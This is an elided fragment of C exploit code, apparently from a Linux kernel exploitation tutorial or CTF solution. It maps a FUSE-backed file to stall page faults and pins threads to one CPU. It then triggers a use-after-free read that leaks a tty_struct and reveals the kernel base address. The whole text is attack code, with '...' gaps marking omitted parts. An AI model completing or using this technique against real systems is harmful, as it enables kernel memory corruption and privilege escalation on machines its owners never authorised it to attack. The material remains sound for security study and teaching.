...
void* mmap_fuse_file(void) {
  ...
  void *page;
  /* The mapping is backed by the file /tmp/test/pwn */
...
int main(int argc, char **argv) {
  ...
  /* Make sure the main thread and FUSE thread run on the same CPU */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");
  ...
  /* [1-1] UAF Read: tty_struct leak (kbase) */
  page = mmap_fuse_file();
  ...
  // Remap the file so a new page fault is caused on the next access, that
  // will invoke the read handler
  page = mmap_fuse_file();
  victim = add(buf, 0x400);
